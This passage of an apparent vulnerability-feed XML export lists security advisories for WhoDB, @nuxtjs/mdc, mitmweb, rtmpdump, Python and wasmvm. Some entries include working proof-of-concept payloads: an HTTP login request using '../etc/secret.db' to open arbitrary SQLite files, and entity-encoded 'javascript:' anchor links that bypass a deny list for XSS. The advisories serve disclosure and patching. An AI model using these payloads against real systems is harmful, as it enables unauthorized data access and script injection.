The attack requires no user authentication to WhoDB (only authentication to any database server, such as an attacker-controlled one) and no special configuration - the default configuration of the application is vulnerable.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-9r4c-jwx3-3j76: 10.0 | <b>WhoDB has a path traversal opening Sqlite3 database</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-9r4c-jwx3-3j76</link>
                    <pubDate>2025-02-06T19:58:24Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-9r4c-jwx3-3j76'>https://osv.dev/vulnerability/GHSA-9r4c-jwx3-3j76</a><br>
                            <b>Published:</b> 2025-02-06T19:58:24Z<br>
                            <b>Severity:</b> 10.0<br>
                            <b>Langs:</b> go<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/clidey/whodb/security/advisories/GHSA-9r4c-jwx3-3j76'>https://github.com/clidey/whodb/security/advisories/GHSA-9r4c-jwx3-3j76</a></li><li>- <a target='_blank' href='https://github.com/clidey/whodb/commit/547336ac73c8d17929c18c3941c0d5b0099753cc'>https://github.com/clidey/whodb/commit/547336ac73c8d17929c18c3941c0d5b0099753cc</a></li><li>- <a target='_blank' href='https://github.com/clidey/whodb'>https://github.com/clidey/whodb</a></li><li>- <a target='_blank' href='https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20'>https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20</a></li><li>- <a target='_blank' href='https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26'>https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26</a></li></ul><br>
                            <b>Details:</b> <b>WhoDB has a path traversal opening Sqlite3 database</b><br>### Summary

While the application only displays Sqlite3 databases present in the directory `&#x2F;db`, there is no path traversal prevention in place. This allows an unauthenticated attacker to open any Sqlite3 database present on the host machine that the application is running on.

### Details

WhoDB allows users to connect to Sqlite3 databases. By default, the databases must be present in `&#x2F;db&#x2F;` (or alternatively `.&#x2F;tmp&#x2F;` if development mode is enabled). Source: https:&#x2F;&#x2F;github.com&#x2F;clidey&#x2F;whodb&#x2F;blob&#x2F;ba6eb81d0ca40baead74bca58b2567166999d6a6&#x2F;core&#x2F;src&#x2F;plugins&#x2F;sqlite3&#x2F;db.go#L14-L20

If no databases are present in the default directory, the UI indicates that the user is unable to open any databases:

![2025-01-22-12-12-42](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;98ffbcf6-907d-4f90-bf11-2c921b2d93b3)

The database file is an user-controlled value. This value is used in `.Join()` with the default directory, in order to get the full path of the database file to open. Source: https:&#x2F;&#x2F;github.com&#x2F;clidey&#x2F;whodb&#x2F;blob&#x2F;ba6eb81d0ca40baead74bca58b2567166999d6a6&#x2F;core&#x2F;src&#x2F;plugins&#x2F;sqlite3&#x2F;db.go#L26

No checks are performed whether the database file that is eventually opened actually resides in the default directory `&#x2F;db`.

This allows an attacker to use path traversal (`..&#x2F;..&#x2F;`) in order to open any Sqlite3 database present on the system. 

### PoC

Before running the container, an example Sqlite3 database with dummy &quot;secret&quot; data was created:
```sh
DB_FILE=$(mktemp)
echo &quot;CREATE TABLE secret_table (data TEXT); INSERT INTO secret_table VALUES (&#x27;secret data&#x27;)&quot; | sqlite3 &quot;$DB_FILE&quot;
```

The container was then created with nothing mounted into `&#x2F;db`, and the dummy database mounted into `&#x2F;etc&#x2F;secret.db`:
```sh
podman run -d -p 8080:8080 -v &quot;$DB_FILE&quot;:&#x2F;etc&#x2F;secret.db docker.io&#x2F;clidey&#x2F;whodb
```

The attacker sends a HTTP request to determine whether the `secret.db` is accessible by setting the `Database` value to `..&#x2F;etc&#x2F;secret.db`:
```http
POST &#x2F;api&#x2F;query HTTP&#x2F;1.1
Host: localhost:8080
content-type: application&#x2F;json
...

{&quot;operationName&quot;:&quot;Login&quot;,&quot;variables&quot;:{&quot;credentials&quot;:{&quot;Type&quot;:&quot;Sqlite3&quot;,&quot;Hostname&quot;:&quot;&quot;,&quot;Database&quot;:&quot;..&#x2F;etc&#x2F;secret.db&quot;,&quot;Username&quot;:&quot;&quot;,&quot;Password&quot;:&quot;&quot;,&quot;Advanced&quot;:[]}},&quot;query&quot;:&quot;mutation Login($credentials: LoginCredentials!) {\n  Login(credentials: $credentials) {\n    Status\n    __typename\n  }\n}&quot;}
```

The server response indicates that the database was successfully opened:
```http
HTTP&#x2F;1.1 200 OK
Content-Type: application&#x2F;json
Set-Cookie: Token=eyJUeXBlIjoiU3FsaXRlMyIsIkhvc3RuYW1lIjoiIiwiVXNlcm5hbWUiOiIiLCJQYXNzd29yZCI6IiIsIkRhdGFiYXNlIjoiLi4vZXRjL3NlY3JldC5kYiJ9; Path=&#x2F;; Expires=Thu, 23 Jan 2025 10:35:43 GMT; HttpOnly
...

{&quot;data&quot;:{&quot;Login&quot;:{&quot;Status&quot;:true,&quot;__typename&quot;:&quot;StatusResponse&quot;}}}
```

The `Set-Cookie` `Token` value is simply a Base64-encoded string with a JSON payload containing the connection details:
```json
{
  &quot;Type&quot;: &quot;Sqlite3&quot;,
  &quot;Hostname&quot;: &quot;&quot;,
  &quot;Username&quot;: &quot;&quot;,
  &quot;Password&quot;: &quot;&quot;,
  &quot;Database&quot;: &quot;..&#x2F;etc&#x2F;secret.db&quot;
}
``` 

The attacker may set this cookie in the browser manually (alongside corresponding profiles in Local Storage) in order to open this database in the WhoDB application graphically. An easy way to perform this is by using a HTTP proxy such as Burp Suite, intercepting the login request and swapping the `Database` value to `..&#x2F;etc&#x2F;secret.db`.

Doing so, the attacker can then browse the database, its tables and the data within:

![2025-01-22-12-36-25](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;c28f1273-7a3c-49e8-bb73-d08a09c7521d)

The attacker may also insert or modify data using either the buttons presented in the UI or the _Scratchpad_ functionality. In this proof-of-concept, the attacker inserts a new row using the _Add Row_ button:

![2025-01-22-12-36-49](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;dbd86beb-9969-464c-9a28-a19d470d0f52)

### Impact

Allows an unauthenticated attacker to open and read any Sqlite3 databases present on the system WhoDB is running on. If WhoDB has write permissions for the database file, the attacker is also able to modify the opened database.

The attacker is unable to create new databases; however, files which already exist but have no content (0-length files) may be opened and modified as fresh databases.

### Recommendations

Before attempting to open the database, resolve and normalize the path to the database and check whether it is in the default directory. If not, present the user with an error.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-24981: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-24981</link>
                    <pubDate>2025-02-06T18:15:32Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-24981'>https://osv.dev/vulnerability/CVE-2025-24981</a><br>
                            <b>Published:</b> 2025-02-06T18:15:32Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> ts<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16'>https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16</a></li></ul><br>
                            <b>Details:</b> <b></b><br>MDC is a tool to take regular Markdown and write documents interacting deeply with a Vue component. In affected versions unsafe parsing logic of the URL from markdown can lead to arbitrary JavaScript code due to a bypass to the existing guards around the `javascript:` protocol scheme in the URL. The parsing logic implement in `props.ts` maintains a deny-list approach to filtering potential malicious payload. It does so by matching protocol schemes like `javascript:` and others. These security guards can be bypassed by an adversarial that provides JavaScript URLs with HTML entities encoded via hex string. Users who consume this library and perform markdown parsing from unvalidated sources could result in rendering vulnerable XSS anchor links. This vulnerability has been addressed in version 0.13.3 and all users are advised to upgrade. There are no known workarounds for this vulnerability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-j82m-pc2v-2484: 9.3 | <b>Parsed HTML anchor links in Markdown provided to parseMarkdown can result in XSS in @nuxtjs&#x2F;mdc</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-j82m-pc2v-2484</link>
                    <pubDate>2025-02-06T17:16:27Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-j82m-pc2v-2484'>https://osv.dev/vulnerability/GHSA-j82m-pc2v-2484</a><br>
                            <b>Published:</b> 2025-02-06T17:16:27Z<br>
                            <b>Severity:</b> 9.3<br>
                            <b>Langs:</b> ts<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/nuxt-modules/mdc/security/advisories/GHSA-j82m-pc2v-2484'>https://github.com/nuxt-modules/mdc/security/advisories/GHSA-j82m-pc2v-2484</a></li><li>- <a target='_blank' href='https://github.com/nuxt-modules/mdc/commit/99097738b5561639e9bf247c55d8103236618bf3'>https://github.com/nuxt-modules/mdc/commit/99097738b5561639e9bf247c55d8103236618bf3</a></li><li>- <a target='_blank' href='https://github.com/nuxt-modules/mdc'>https://github.com/nuxt-modules/mdc</a></li><li>- <a target='_blank' href='https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16'>https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16</a></li></ul><br>
                            <b>Details:</b> <b>Parsed HTML anchor links in Markdown provided to parseMarkdown can result in XSS in @nuxtjs&#x2F;mdc</b><br>### Summary
An unsafe parsing logic of the URL from markdown can lead to arbitrary JavaScript code due to a bypass to the existing guards around the `javascript:` protocol scheme in the URL.

### Details

The parsing logic implement at [https:&#x2F;&#x2F;github.com&#x2F;nuxt-modules&#x2F;mdc&#x2F;blob&#x2F;main&#x2F;src&#x2F;runtime&#x2F;parser&#x2F;utils&#x2F;props.ts#L16](https:&#x2F;&#x2F;github.com&#x2F;nuxt-modules&#x2F;mdc&#x2F;blob&#x2F;main&#x2F;src&#x2F;runtime&#x2F;parser&#x2F;utils&#x2F;props.ts#L16) maintains a deny-list approach to filtering potential malicious payload. It does so by matching protocol schemes like `javascript:` and others.

Specifically, this is the code from the mdc library&#x27;s parser that is not secure enough:

```js
export const unsafeLinkPrefix = [
  &#x27;javascript:&#x27;,
  &#x27;data:text&#x2F;html&#x27;,
  &#x27;vbscript:&#x27;,
  &#x27;data:text&#x2F;javascript&#x27;,
  &#x27;data:text&#x2F;vbscript&#x27;,
  &#x27;data:text&#x2F;css&#x27;,
  &#x27;data:text&#x2F;plain&#x27;,
  &#x27;data:text&#x2F;xml&#x27;
]

export const validateProp = (attribute: string, value: string) =&amp;gt; {
  if (attribute.startsWith(&#x27;on&#x27;)) {
    return false
  }

  if (attribute === &#x27;href&#x27; || attribute === &#x27;src&#x27;) {
    return !unsafeLinkPrefix.some(prefix =&amp;gt; value.toLowerCase().startsWith(prefix))
  }

  return true
}
```

These security guards can be bypassed by an adversarial that provides JavaScript URLs with HTML entities encoded via hex string.

### PoC

The following URL payloads if provided to the markdown parsing library (such as through the usage of `import { parseMarkdown } from &#x27;@nuxtjs&#x2F;mdc&#x2F;runtime&#x27;;`) will trigger the alert() dialog:

```markdown
# ✅ This is correctly escaped by the parser

- XSS Attempt:

&amp;lt;a href=&quot;javascript:alert(1)&quot;&amp;gt; this gets sanitizied, yay!&amp;lt;&#x2F;a&amp;gt;

# ❌ These are vulnerable and not escaped

- Bypass 1:

&amp;lt;a href=&quot;jav&amp;#x09;ascript:alert(&#x27;XSS&#x27;);&quot;&amp;gt;Click Me 1&amp;lt;&#x2F;a&amp;gt;

- Bypass 2:

&amp;lt;a href=&quot;jav&amp;#x0A;ascript:alert(&#x27;XSS&#x27;);&quot;&amp;gt;Click Me 2&amp;lt;&#x2F;a&amp;gt;

- Bypass 3:

&amp;lt;a href=&quot;jav&amp;#10;ascript:alert(&#x27;XSS&#x27;);&quot;&amp;gt;Click Me 3&amp;lt;&#x2F;a&amp;gt;
```

### Impact

Users who consume this library and perform markdown parsing from unvalidated sources such as LLM generative text responses, user input and other untrusted sources could result in rendering vulnerable XSS anchor links.

## Reference

You may infer the following write-up for more in-depth walkthrough of URL parsing problems and suggestions on how to securely address them: [How to Parse URLs from Markdown to HTML Securely?](https:&#x2F;&#x2F;www.nodejs-security.com&#x2F;blog&#x2F;how-to-parse-urls-from-markdown-to-html-securely)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vrpv-vw92-328g: 0 | <b>Multiple rtmpdump vulnerabilities</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vrpv-vw92-328g</link>
                    <pubDate>2025-02-06T17:10:32Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vrpv-vw92-328g'>https://osv.dev/vulnerability/GHSA-vrpv-vw92-328g</a><br>
                            <b>Published:</b> 2025-02-06T17:10:32Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Rudloff/rtmpdump-bin/security/advisories/GHSA-vrpv-vw92-328g'>https://github.com/Rudloff/rtmpdump-bin/security/advisories/GHSA-vrpv-vw92-328g</a></li><li>- <a target='_blank' href='https://github.com/Rudloff/rtmpdump-bin'>https://github.com/Rudloff/rtmpdump-bin</a></li></ul><br>
                            <b>Details:</b> <b>Multiple rtmpdump vulnerabilities</b><br>The version of rtmpdump contained in this package has multiple known vulnerabilities.

### Patches
This package is abandoned and should not be used anymore.
There is no patched release.

### Workarounds
You should install rmtpdump from another source.

### References
* https:&#x2F;&#x2F;github.com&#x2F;advisories&#x2F;GHSA-fm48-q5qq-894j
* https:&#x2F;&#x2F;github.com&#x2F;advisories&#x2F;GHSA-pfv7-grcx-8gcc
* https:&#x2F;&#x2F;github.com&#x2F;advisories&#x2F;GHSA-hg4c-2mw4-gwpm
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-wg33-5h85-7q5p: 8.2 | <b>Mitmweb API Authentication Bypass Using Proxy Server</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-wg33-5h85-7q5p</link>
                    <pubDate>2025-02-06T17:07:41Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-wg33-5h85-7q5p'>https://osv.dev/vulnerability/GHSA-wg33-5h85-7q5p</a><br>
                            <b>Published:</b> 2025-02-06T17:07:41Z<br>
                            <b>Severity:</b> 8.2<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/mitmproxy/mitmproxy/security/advisories/GHSA-wg33-5h85-7q5p'>https://github.com/mitmproxy/mitmproxy/security/advisories/GHSA-wg33-5h85-7q5p</a></li><li>- <a target='_blank' href='https://github.com/mitmproxy/mitmproxy/commit/fa89055e196d953f11fd241e36ee37858993486a'>https://github.com/mitmproxy/mitmproxy/commit/fa89055e196d953f11fd241e36ee37858993486a</a></li><li>- <a target='_blank' href='https://en.wikipedia.org/wiki/Server-side_request_forgery'>https://en.wikipedia.org/wiki/Server-side_request_forgery</a></li><li>- <a target='_blank' href='https://github.com/mitmproxy/mitmproxy'>https://github.com/mitmproxy/mitmproxy</a></li><li>- <a target='_blank' href='https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md'>https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md</a></li><li>- <a target='_blank' href='https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md#06-february-2025-mitmproxy-1112'>https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md#06-february-2025-mitmproxy-1112</a></li></ul><br>
                            <b>Details:</b> <b>Mitmweb API Authentication Bypass Using Proxy Server</b><br>### Impact
In mitmweb 11.1.0 and below, a malicious client can use mitmweb&#x27;s proxy server (bound to `*:8080` by default) to access mitmweb&#x27;s internal API (bound to `127.0.0.1:8081` by default). In other words, while the client cannot access the API directly (good), they can access the API through the proxy (bad). An attacker may be able to escalate this [SSRF](https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Server-side_request_forgery)-style access to remote code execution.

The mitmproxy and mitmdump tools are unaffected. Only mitmweb is affected. The `block_global` option, which is enabled by default, blocks connections originating from publicly-routable IP addresses in the proxy. The attacker needs to be in the same local network.

### Patches

The vulnerability has been fixed in mitmproxy 11.1.2 and above.

### Acknowledgements

We thank Stefan Grönke (@gronke) for reporting this vulnerability as part of a security audit by [Radically Open Security](https:&#x2F;&#x2F;www.radicallyopensecurity.com&#x2F;). This audit was supported by the [NGI0 Entrust fund](https:&#x2F;&#x2F;nlnet.nl&#x2F;entrust&#x2F;) established by [NLnet](https:&#x2F;&#x2F;nlnet.nl&#x2F;).

### Timeline

- **2025-01-14**: Received initial report. 
- **2025-01-14**: Verified report and confirmed receipt.
- **2025-01-19**: Shared patch with researcher.
- **2025-02-04**: Received final confirmation that patch is working.
- **2025-02-05**: Published patched release and advisory.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-2024-12254: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-2024-12254</link>
                    <pubDate>2025-02-06T12:33:19.896Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-2024-12254'>https://osv.dev/vulnerability/BIT-python-2024-12254</a><br>
                            <b>Published:</b> 2025-02-06T12:33:19.896Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/commit/71e8429ac8e2adc10084ab5ec29a62f4b6671a82'>https://github.com/python/cpython/commit/71e8429ac8e2adc10084ab5ec29a62f4b6671a82</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/9aa0deb2eef2655a1029ba228527b152353135b5'>https://github.com/python/cpython/commit/9aa0deb2eef2655a1029ba228527b152353135b5</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/e991ac8f2037d78140e417cc9a9486223eb3e786'>https://github.com/python/cpython/commit/e991ac8f2037d78140e417cc9a9486223eb3e786</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/127655'>https://github.com/python/cpython/issues/127655</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/127656'>https://github.com/python/cpython/pull/127656</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/H4O3UBAOAQQXGT4RE3E4XQYR5XLROORB/'>https://mail.python.org/archives/list/security-announce@python.org/thread/H4O3UBAOAQQXGT4RE3E4XQYR5XLROORB/</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/12/06/1'>http://www.openwall.com/lists/oss-security/2024/12/06/1</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Starting in Python 3.12.0, the asyncio._SelectorSocketTransport.writelines() method would not &quot;pause&quot; writing and signal to the Protocol to drain the buffer to the wire once the write buffer reached the &quot;high-water mark&quot;. Because of this, Protocols would not periodically drain the write buffer potentially leading to memory exhaustion.This vulnerability likely impacts a small number of users, you must be using Python 3.12.0 or later, on macOS or Linux, using the asyncio module with protocols, and using .writelines() method which had new zero-copy-on-write behavior in Python 3.12.0 and later. If not all of these factors are true then your usage of Python is unaffected.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2024-12254: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2024-12254</link>
                    <pubDate>2025-02-06T12:33:16.877Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2024-12254'>https://osv.dev/vulnerability/BIT-python-min-2024-12254</a><br>
                            <b>Published:</b> 2025-02-06T12:33:16.877Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/commit/71e8429ac8e2adc10084ab5ec29a62f4b6671a82'>https://github.com/python/cpython/commit/71e8429ac8e2adc10084ab5ec29a62f4b6671a82</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/9aa0deb2eef2655a1029ba228527b152353135b5'>https://github.com/python/cpython/commit/9aa0deb2eef2655a1029ba228527b152353135b5</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/e991ac8f2037d78140e417cc9a9486223eb3e786'>https://github.com/python/cpython/commit/e991ac8f2037d78140e417cc9a9486223eb3e786</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/127655'>https://github.com/python/cpython/issues/127655</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/127656'>https://github.com/python/cpython/pull/127656</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/H4O3UBAOAQQXGT4RE3E4XQYR5XLROORB/'>https://mail.python.org/archives/list/security-announce@python.org/thread/H4O3UBAOAQQXGT4RE3E4XQYR5XLROORB/</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/12/06/1'>http://www.openwall.com/lists/oss-security/2024/12/06/1</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Starting in Python 3.12.0, the asyncio._SelectorSocketTransport.writelines() method would not &quot;pause&quot; writing and signal to the Protocol to drain the buffer to the wire once the write buffer reached the &quot;high-water mark&quot;. Because of this, Protocols would not periodically drain the write buffer potentially leading to memory exhaustion.This vulnerability likely impacts a small number of users, you must be using Python 3.12.0 or later, on macOS or Linux, using the asyncio module with protocols, and using .writelines() method which had new zero-copy-on-write behavior in Python 3.12.0 and later. If not all of these factors are true then your usage of Python is unaffected.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-2025-0938: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-2025-0938</link>
                    <pubDate>2025-02-06T07:20:20.901Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-2025-0938'>https://osv.dev/vulnerability/BIT-python-2025-0938</a><br>
                            <b>Published:</b> 2025-02-06T07:20:20.901Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/commit/90e526ae67b172ed7c6c56e7edad36263b0f9403'>https://github.com/python/cpython/commit/90e526ae67b172ed7c6c56e7edad36263b0f9403</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/a7084f6075c9595ba60119ce8c62f1496f50c568'>https://github.com/python/cpython/commit/a7084f6075c9595ba60119ce8c62f1496f50c568</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/d89a5f6a6e65511a5f6e0618c4c30a7aa5aba56a'>https://github.com/python/cpython/commit/d89a5f6a6e65511a5f6e0618c4c30a7aa5aba56a</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/105704'>https://github.com/python/cpython/issues/105704</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/129418'>https://github.com/python/cpython/pull/129418</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/K4EUG6EKV6JYFIC24BASYOZS4M5XOQIB/'>https://mail.python.org/archives/list/security-announce@python.org/thread/K4EUG6EKV6JYFIC24BASYOZS4M5XOQIB/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The Python standard library functions `urllib.parse.urlsplit` and `urlparse` accepted domain names that included square brackets which isn&#x27;t valid according to RFC 3986. Square brackets are only meant to be used as delimiters for specifying IPv6 and IPvFuture hosts in URLs. This could result in differential parsing across the Python URL parser and other specification-compliant URL parsers.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2025-0938: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2025-0938</link>
                    <pubDate>2025-02-06T07:20:18.791Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2025-0938'>https://osv.dev/vulnerability/BIT-python-min-2025-0938</a><br>
                            <b>Published:</b> 2025-02-06T07:20:18.791Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/commit/90e526ae67b172ed7c6c56e7edad36263b0f9403'>https://github.com/python/cpython/commit/90e526ae67b172ed7c6c56e7edad36263b0f9403</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/a7084f6075c9595ba60119ce8c62f1496f50c568'>https://github.com/python/cpython/commit/a7084f6075c9595ba60119ce8c62f1496f50c568</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/d89a5f6a6e65511a5f6e0618c4c30a7aa5aba56a'>https://github.com/python/cpython/commit/d89a5f6a6e65511a5f6e0618c4c30a7aa5aba56a</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/105704'>https://github.com/python/cpython/issues/105704</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/129418'>https://github.com/python/cpython/pull/129418</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/K4EUG6EKV6JYFIC24BASYOZS4M5XOQIB/'>https://mail.python.org/archives/list/security-announce@python.org/thread/K4EUG6EKV6JYFIC24BASYOZS4M5XOQIB/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The Python standard library functions `urllib.parse.urlsplit` and `urlparse` accepted domain names that included square brackets which isn&#x27;t valid according to RFC 3986. Square brackets are only meant to be used as delimiters for specifying IPv6 and IPvFuture hosts in URLs. This could result in differential parsing across the Python URL parser and other specification-compliant URL parsers.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-1066: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-1066</link>
                    <pubDate>2025-02-06T00:15:27Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-1066'>https://osv.dev/vulnerability/CVE-2025-1066</a><br>
                            <b>Published:</b> 2025-02-06T00:15:27Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://medium.com/@alimuhammadsecured/cyberforce-2024-how-i-found-my-first-cve-openplcv3-16c058b114b0'>https://medium.com/@alimuhammadsecured/cyberforce-2024-how-i-found-my-first-cve-openplcv3-16c058b114b0</a></li></ul><br>
                            <b>Details:</b> <b></b><br>OpenPLC_V3 contains an arbitrary file upload vulnerability, which could be leveraged for malvertising or phishing campaigns.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3448: 0 | wasmvm: Malicious smart contract can crash the chain in github.com&#x2F;CosmWasm&#x2F;wasmvm</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3448</link>
                    <pubDate>2025-02-05T23:27:45Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3448'>https://osv.dev/vulnerability/GO-2025-3448</a><br>
                            <b>Published:</b> 2025-02-05T23:27:45Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2025-001.md'>https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2025-001.md</a></li></ul><br>
                            <b>Details:</b> wasmvm: Malicious smart contract can crash the chain in github.com&#x2F;CosmWasm&#x2F;wasmvm
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3449: 0 | wasmvm: Malicious smart contract can slow down block production in github.com&#x2F;CosmWasm&#x2F;wasmvm</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3449</link>
                    <pubDate>2025-02-05T23:27:45Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3449'>https://osv.dev/vulnerability/GO-2025-3449</a><br>
                            <b>Published:</b> 2025-02-05T23:27:45Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2025-002.md'>https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2025-002.md</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/cosmwasm/commit/2b7f2faa57a1efc8207455c37f87f1eee6035a27'>https://github.com/CosmWasm/cosmwasm/commit/2b7f2faa57a1efc8207455c37f87f1eee6035a27</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/cosmwasm/commit/a5d62f65b5eb947ebe40e2085b1c48a9d0a244d0'>https://github.com/CosmWasm/cosmwasm/commit/a5d62f65b5eb947ebe40e2085b1c48a9d0a244d0</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/cosmwasm/commit/d6143b0aff16a39bbea4be37597d8e9d9b213d3b'>https://github.com/CosmWasm/cosmwasm/commit/d6143b0aff16a39bbea4be37597d8e9d9b213d3b</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/cosmwasm/commit/f0c04c03cbe2557634c1bbcdc2ce203fe7caca58'>https://github.com/CosmWasm/cosmwasm/commit/f0c04c03cbe2557634c1bbcdc2ce203fe7caca58</a></li></ul><br>
                            <b>Details:</b> wasmvm: Malicious smart contract can slow down block production in github.com&#x2F;CosmWasm&#x2F;wasmvm
                        ]]>
                    </description>
                </item>
            
                <item>
